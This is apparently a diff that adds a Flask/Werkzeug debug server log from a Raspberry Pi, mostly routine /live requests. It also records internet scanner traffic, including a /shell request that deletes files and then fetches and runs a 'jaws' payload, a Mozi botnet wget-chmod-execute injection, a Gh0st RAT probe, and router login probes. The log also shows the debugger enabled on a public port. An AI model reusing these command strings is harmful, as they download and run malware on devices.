@@ -1,0 +1,1134 @@
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:43:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:43:38] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:43:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:44:01] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:44:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:57:59] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:57:59] "GET /live?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:57:59] "GET /live?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:57:59] "GET /live?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:57:59] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:58:00] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:59:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [02/Oct/2021 23:59:07] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:00:46] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:162.62.117.51 - - [03/Oct/2021 00:02:39] "GET / HTTP/1.0" 404 -
+INFO:werkzeug:162.62.117.51 - - [03/Oct/2021 00:02:42] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:02:51] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:03:06] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:04:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:04:41] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:04:44] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:04:48] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:04:51] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:04:54] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:04:56] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:05:33] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:05:33] "GET /live?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:05:33] "GET /live?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:05:33] "GET /live?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:05:33] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:05:33] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:06:31] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:06:31] "GET /live?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:06:31] "GET /live?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:06:31] "GET /live?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:06:31] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:06:31] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:07:44] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:07:44] "GET /live?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:07:44] "GET /live?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:07:44] "GET /live?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:07:45] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:07:45] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:09:31] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:14:00] "GET /live HTTP/1.1" 500 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:14:00] "GET /live?__debugger__=yes&cmd=resource&f=style.css HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:14:00] "GET /live?__debugger__=yes&cmd=resource&f=debugger.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:14:00] "GET /live?__debugger__=yes&cmd=resource&f=jquery.js HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:14:00] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:14:00] "GET /live?__debugger__=yes&cmd=resource&f=console.png HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:14:27] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:15:03] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:15:11] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:19:18] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:22:07] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:22:11] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:22:41] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:24:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Restarting with stat
+WARNING:werkzeug: * Debugger is active!
+INFO:werkzeug: * Debugger PIN: 211-708-015
+INFO:werkzeug: * Detected change in '/home/pi/Development/server/main.py', reloading
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:31:27] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:32:12] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:32:17] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:33:01] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:34:03] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:35:27] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:36:48] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:36:51] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:36:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:37:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:192.168.10.191 - - [03/Oct/2021 00:37:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:209.141.56.212 - - [03/Oct/2021 00:37:21] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+INFO:werkzeug: * Running on http://0.0.0.0:80/ (Press CTRL+C to quit)
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:17:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:17:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:15] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:41:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:10] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:15] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:25] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:30] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:40] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:45] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:42:55] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:43:00] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.91.85.134 - - [03/Oct/2021 00:43:05] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:107.189.6.44 - - [03/Oct/2021 01:13:53] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:24:37] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:24:41] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:24:46] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:24:51] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:24:56] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:25:01] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:25:06] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:25:11] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:25:16] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.84.7.210 - - [03/Oct/2021 01:25:21] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.62.100 - - [03/Oct/2021 01:37:42] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.238.62.100 - - [03/Oct/2021 01:37:46] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.230.1.145 - - [03/Oct/2021 01:49:20] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.230.1.145 - - [03/Oct/2021 01:49:24] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.230.1.145 - - [03/Oct/2021 01:49:29] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.230.1.145 - - [03/Oct/2021 01:49:31] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.230.1.145 - - [03/Oct/2021 01:49:36] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.230.1.145 - - [03/Oct/2021 01:49:56] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.230.1.145 - - [03/Oct/2021 01:50:01] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:107.189.31.252 - - [03/Oct/2021 02:05:35] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+ERROR:werkzeug:66.240.205.34 - - [03/Oct/2021 02:08:23] code 400, message Bad request version ('®¯]')
+INFO:werkzeug:66.240.205.34 - - [03/Oct/2021 02:08:23] "Gh0st­   à   xKS``ÃÀÀÀÄ@¼Q	H§e&§*$&g+2ö°00¬¨rc  \`&ÇK7ån9n;3¬èsch¨^Ï4'J©ã0Ãh]&øÎSËA4L?2=áÄ@õ`T®¯]" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:80.66.88.100 - - [03/Oct/2021 02:21:21] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:198.98.60.202 - - [03/Oct/2021 02:23:03] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:34.231.122.138 - - [03/Oct/2021 02:41:34] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:34.207.151.206 - - [03/Oct/2021 02:41:35] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:34.207.151.206 - - [03/Oct/2021 02:41:39] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:222.186.19.235 - - [03/Oct/2021 02:41:40] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 404 -
+INFO:werkzeug:222.186.19.235 - - [03/Oct/2021 02:41:40] "GET http://fuwu.sogou.com/404/index.html HTTP/1.1" 404 -
+INFO:werkzeug:23.148.145.235 - - [03/Oct/2021 02:44:49] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:107.189.14.98 - - [03/Oct/2021 02:47:15] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:77.247.108.81 - - [03/Oct/2021 03:02:32] "POST /goform/websLogin HTTP/1.1" 404 -
+INFO:werkzeug:156.199.211.193 - - [03/Oct/2021 03:23:35] "GET /shell?cd+/tmp;rm+-rf+*;wget+193.23.161.113/jaws;sh+/tmp/jaws HTTP/1.1" 404 -
+INFO:werkzeug:44.197.250.246 - - [03/Oct/2021 03:52:28] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:44.197.250.246 - - [03/Oct/2021 03:52:32] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:44.197.250.246 - - [03/Oct/2021 03:52:37] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:31] "GET /TP/public/index.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:32] "GET /TP/index.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:32] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:34] "GET /html/public/index.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:35] "GET /public/index.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:35] "GET /TP/html/public/index.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:36] "GET /elrekt.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:36] "GET /index.php HTTP/1.1" 404 -
+INFO:werkzeug:222.77.181.28 - - [03/Oct/2021 04:01:37] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:107.189.6.44 - - [03/Oct/2021 04:16:37] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+INFO:werkzeug:103.195.36.22 - - [03/Oct/2021 04:46:52] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:192.241.210.213 - - [03/Oct/2021 05:12:39] "GET /portal/redlion HTTP/1.1" 404 -
+ERROR:werkzeug:123.146.197.42 - - [03/Oct/2021 05:36:07] code 400, message Bad HTTP/0.9 request type ('27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$')
+INFO:werkzeug:123.146.197.42 - - [03/Oct/2021 05:36:07] "27;wget%20http://%s:%d/Mozi.m%20-O%20->%20/tmp/Mozi.m;chmod%20777%20/tmp/Mozi.m;/tmp/Mozi.m%20dlink.mips%27$ HTTP/1.0" HTTPStatus.BAD_REQUEST -
+INFO:werkzeug:192.241.202.131 - - [03/Oct/2021 05:43:52] "GET /actuator/health HTTP/1.1" 404 -
+INFO:werkzeug:143.244.172.146 - - [03/Oct/2021 05:49:17] "GET http://wall.angelsword.cc/lixuan.php HTTP/1.1" 404 -
+INFO:werkzeug:143.244.172.146 - - [03/Oct/2021 05:49:23] "GET http://wall.angelsword.cc/lixuan.php HTTP/1.1" 404 -
+INFO:werkzeug:192.241.206.206 - - [03/Oct/2021 06:19:22] "GET /hudson HTTP/1.1" 404 -
+INFO:werkzeug:209.141.56.212 - - [03/Oct/2021 06:59:39] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+INFO:werkzeug:107.189.14.98 - - [03/Oct/2021 07:32:13] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:107.189.6.44 - - [03/Oct/2021 08:08:54] "POST /boaform/admin/formLogin HTTP/1.1" 404 -
+INFO:werkzeug:23.251.102.74 - - [03/Oct/2021 08:34:01] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:209.141.62.185 - - [03/Oct/2021 09:32:24] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+INFO:werkzeug:107.189.14.98 - - [03/Oct/2021 09:39:10] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:185.109.56.0 - - [03/Oct/2021 10:01:23] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:209.141.56.212 - - [03/Oct/2021 10:15:57] "GET /config/getuser?index=0 HTTP/1.1" 404 -
+INFO:werkzeug:102.190.97.71 - - [03/Oct/2021 11:32:47] "GET / HTTP/1.1" 404 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:38:50] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:38:53] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:38:59] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:39:04] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:39:09] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:39:14] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:39:19] "GET /live HTTP/1.1" 200 -
+INFO:werkzeug:3.235.245.233 - - [03/Oct/2021 11:39:24] "GET /live HTTP/1.1" 200 -
